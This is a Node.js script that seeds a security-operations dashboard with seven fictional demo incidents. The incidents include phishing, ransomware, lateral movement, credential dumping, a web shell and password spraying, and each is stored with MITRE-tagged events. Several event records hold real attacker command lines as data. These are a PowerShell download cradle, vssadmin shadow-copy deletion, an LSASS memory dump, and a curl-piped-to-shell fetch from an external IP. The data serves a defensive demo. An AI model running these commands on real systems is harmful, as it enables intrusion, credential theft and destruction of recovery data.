// Seeds demo attack scenarios into the SOC tables (incidents INC-2001…, events EVT-2xxx-n).
// Timestamps are relative to "now" so the dashboards show recent activity. Idempotent.
//   pnpm db:seed-demo            insert / refresh the scenarios
//   pnpm db:seed-demo --remove   delete them again
import { neon } from '@neondatabase/serverless'
import fs from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const root = path.join(path.dirname(fileURLToPath(import.meta.url)), '..')
let url = process.env.DATABASE_URL
if (!url) {
  const env = path.join(root, '.env.local')
  const m = fs.existsSync(env) && fs.readFileSync(env, 'utf8').match(/^DATABASE_URL=(.*)$/m)
  url = m && m[1].trim().replace(/^["']|["']$/g, '')
}
if (!url) { console.error('DATABASE_URL is not set'); process.exit(1) }
const sql = neon(url)

// minutesAgo, event_type, severity, mitre, detection_method, extra fields
const SCENARIOS = [
  {
    id: 'INC-2001', title: 'Phishing email led to PowerShell download', severity: 'high', status: 'investigating', risk: 86, conf: 88.5,
    source: 'Email gateway + EDR', model: 'SOC-XGBoost-v1.4', analyst: null, hoursAgo: 5,
    summary: 'A user opened a macro-enabled invoice attachment; Word spawned PowerShell, which downloaded a payload from an external host.',
    events: [
      [310, 'EMAIL_RECEIVED', 'medium', 'T1566', 'rule', { username: 'a.kumar', hostname: 'WIN-FIN-03', source_ip: '45.137.21.9' }],
      [302, 'PROCESS_EXECUTION', 'high', 'T1059.001', 'ml_anomaly', { username: 'a.kumar', hostname: 'WIN-FIN-03', process_name: 'powershell.exe', command_line: 'powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(...)', raw_event: { pid: 6212, parent_process: 'WINWORD.EXE' } }],
      [301, 'NETWORK_CONNECTION', 'high', 'T1105', 'correlation', { username: 'a.kumar', hostname: 'WIN-FIN-03', source_ip: '10.24.8.45', destination_ip: '45.137.21.9', destination_port: 443 }],
      [299, 'FILE_CREATED', 'high', 'T1105', 'rule', { username: 'a.kumar', hostname: 'WIN-FIN-03', process_name: 'powershell.exe', command_line: 'C:\\Users\\a.kumar\\AppData\\Local\\Temp\\upd.exe', raw_event: { pid: 6212 } }],
    ],
  },
  {
    id: 'INC-2002', title: 'Ransomware encryption on file server', severity: 'critical', status: 'new', risk: 98, conf: 96.2,
    source: 'EDR behavioural', model: 'SOC-XGBoost-v1.4', analyst: null, hoursAgo: 1,
    summary: 'Hundreds of files on the finance share were renamed with a new extension within minutes, preceded by shadow-copy deletion.',
    events: [
      [70, 'PROCESS_EXECUTION', 'critical', 'T1490', 'rule', { username: 'svc_backup', hostname: 'WIN-SRV-02', process_name: 'vssadmin.exe', command_line: 'vssadmin delete shadows /all /quiet', raw_event: { pid: 4410, parent_process: 'cmd.exe' } }],
      [66, 'FILE_MODIFIED', 'critical', 'T1486', 'ml_anomaly', { username: 'svc_backup', hostname: 'WIN-SRV-02', process_name: 'svch0st.exe', command_line: '1,284 files renamed *.locked', raw_event: { pid: 5120 } }],
      [64, 'NETWORK_CONNECTION', 'high', 'T1071.001', 'correlation', { username: 'svc_backup', hostname: 'WIN-SRV-02', source_ip: '10.24.8.41', destination_ip: '193.142.146.35', destination_port: 443 }],
    ],
  },
  {
    id: 'INC-2003', title: 'Lateral movement over RDP with admin account', severity: 'high', status: 'contained', risk: 82, conf: 79.4,
    source: 'SIEM correlation', model: 'SOC-XGBoost-v1.4', analyst: 'Divya Pandey', hoursAgo: 30,
    summary: 'The admin account logged on interactively to three servers from a developer workstation outside its usual pattern.',
    events: [
      [1810, 'AUTH_SUCCESS', 'medium', 'T1078', 'correlation', { username: 'admin', hostname: 'WIN-SRV-01', source_ip: '10.24.8.44' }],
      [1795, 'NETWORK_CONNECTION', 'high', 'T1021', 'rule', { username: 'admin', hostname: 'WIN-DEV-04', source_ip: '10.24.8.44', destination_ip: '10.24.8.47', destination_port: 3389 }],
      [1790, 'AUTH_SUCCESS', 'high', 'T1021', 'ml_anomaly', { username: 'admin', hostname: 'DB-PROD-01', source_ip: '10.24.8.44' }],
    ],
  },
  {
    id: 'INC-2004', title: 'Credential dumping from LSASS memory', severity: 'critical', status: 'investigating', risk: 95, conf: 93.1,
    source: 'EDR', model: 'SOC-XGBoost-v1.4', analyst: 'Divya Pandey', hoursAgo: 12,
    summary: 'A renamed procdump binary accessed LSASS memory on a domain-joined server and wrote a dump file to a temp directory.',
    events: [
      [725, 'PROCESS_EXECUTION', 'critical', 'T1003', 'rule', { username: 'admin', hostname: 'WIN-SRV-01', process_name: 'pd64.exe', command_line: 'pd64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\ls.dmp', raw_event: { pid: 7720, parent_process: 'cmd.exe' } }],
      [724, 'FILE_CREATED', 'high', 'T1003', 'rule', { username: 'admin', hostname: 'WIN-SRV-01', command_line: 'C:\\Windows\\Temp\\ls.dmp' }],
    ],
  },
  {
    id: 'INC-2005', title: 'Web shell after exploit of public web app', severity: 'high', status: 'new', risk: 88, conf: 84.0,
    source: 'WAF + EDR', model: 'SOC-XGBoost-v1.4', analyst: null, hoursAgo: 3,
    summary: 'An injection payload against the public web application was followed by the web server process spawning a shell.',
    events: [
      [190, 'WEB_REQUEST', 'medium', 'T1190', 'rule', { hostname: 'LINUX-WEB-01', source_ip: '103.75.190.11', destination_ip: '10.24.8.43', destination_port: 443 }],
      [186, 'PROCESS_EXECUTION', 'high', 'T1059', 'ml_anomaly', { username: 'www-data', hostname: 'LINUX-WEB-01', process_name: 'sh', command_line: "sh -c 'curl http://103.75.190.11/x | sh'", raw_event: { pid: 30211, parent_process: 'php-fpm' } }],
      [185, 'NETWORK_CONNECTION', 'high', 'T1105', 'correlation', { username: 'www-data', hostname: 'LINUX-WEB-01', source_ip: '10.24.8.43', destination_ip: '103.75.190.11', destination_port: 80 }],
    ],
  },
  {
    id: 'INC-2006', title: 'Password spraying against VPN accounts', severity: 'medium', status: 'resolved', risk: 64, conf: 71.5,
    source: 'Identity provider', model: 'SOC-XGBoost-v1.4', analyst: 'Divya Pandey', hoursAgo: 96,
    summary: 'One external address tried a single common password against many accounts; no logon succeeded. Source blocked.',
    events: [
      [5770, 'AUTH_FAILURE', 'medium', 'T1110.003', 'rule', { username: 'm.lee', hostname: 'VPN-GW-01', source_ip: '5.188.206.14' }],
      [5768, 'AUTH_FAILURE', 'medium', 'T1110.003', 'rule', { username: 's.patel', hostname: 'VPN-GW-01', source_ip: '5.188.206.14' }],
      [5766, 'AUTH_FAILURE', 'medium', 'T1110.003', 'correlation', { username: 'james', hostname: 'VPN-GW-01', source_ip: '5.188.206.14' }],
    ],
  },
  {
    id: 'INC-2007', title: 'Internal port scan from IT asset scanner', severity: 'low', status: 'false_positive', risk: 22, conf: 41.0,
    source: 'Network sensor', model: 'SOC-XGBoost-v1.4', analyst: 'Divya Pandey', hoursAgo: 140,
    summary: 'Sequential connections to many ports from the IT asset-inventory scanner during its scheduled window. Benign.',
    events: [
      [8400, 'NETWORK_CONNECTION', 'low', 'T1046', 'ml_anomaly', { hostname: 'FW-01', source_ip: '10.24.1.10', destination_ip: '10.24.8.47', destination_port: 1433 }],
      [8399, 'NETWORK_CONNECTION', 'low', 'T1046', 'ml_anomaly', { hostname: 'FW-01', source_ip: '10.24.1.10', destination_ip: '10.24.8.47', destination_port: 3306 }],
    ],
  },
]

const ids = SCENARIOS.map((s) => s.id)
await sql`DELETE FROM events WHERE incident_id = ANY(${ids})`
await sql`DELETE FROM incidents WHERE id = ANY(${ids})`
if (process.argv.includes('--remove')) {
  console.log(`Removed ${ids.length} demo scenarios.`)
  process.exit(0)
}

// Techniques used here that the MITRE seed does not cover.
await sql`INSERT INTO mitre_techniques (id, name, tactic, description) VALUES
  ('T1490', 'Inhibit System Recovery', 'Impact', 'Adversaries may delete or remove built-in data and turn off services designed to aid in recovery.')
  ON CONFLICT (id) DO NOTHING`

const now = Date.now()
let n = 0
for (const s of SCENARIOS) {
  const entities = new Set()
  s.events.forEach(([, , , , , f]) => ['username', 'hostname', 'source_ip', 'destination_ip'].forEach((k) => f[k] && entities.add(f[k])))
  await sql`INSERT INTO incidents (id, title, severity, status, risk_score, ai_confidence, detected_at, assigned_analyst,
              summary, detection_source, detection_model, correlated_event_count, affected_entity_count)
            VALUES (${s.id}, ${s.title}, ${s.severity}, ${s.status}, ${s.risk}, ${s.conf},
              ${new Date(now - s.hoursAgo * 3600e3).toISOString()}, ${s.analyst}, ${s.summary}, ${s.source}, ${s.model},
              ${s.events.length}, ${entities.size})`
  for (const [i, [mins, type, sev, mitre, method, f]] of s.events.entries()) {
    await sql`INSERT INTO events (id, incident_id, timestamp, event_type, source, username, hostname, source_ip, destination_ip,
                destination_port, process_name, command_line, severity, detection_method, mitre_technique, raw_event)
              VALUES (${`EVT-${s.id.slice(4)}-${i + 1}`}, ${s.id}, ${new Date(now - mins * 60e3).toISOString()}, ${type},
                ${s.source.split(' ')[0]}, ${f.username ?? null}, ${f.hostname ?? null}, ${f.source_ip ?? null},
                ${f.destination_ip ?? null}, ${f.destination_port ?? null}, ${f.process_name ?? null}, ${f.command_line ?? null},
                ${sev}, ${method}, ${mitre}, ${f.raw_event ? JSON.stringify(f.raw_event) : null})`
    n++
  }
}
console.log(`Seeded ${SCENARIOS.length} demo incidents with ${n} events (${ids[0]}…${ids.at(-1)}).`)
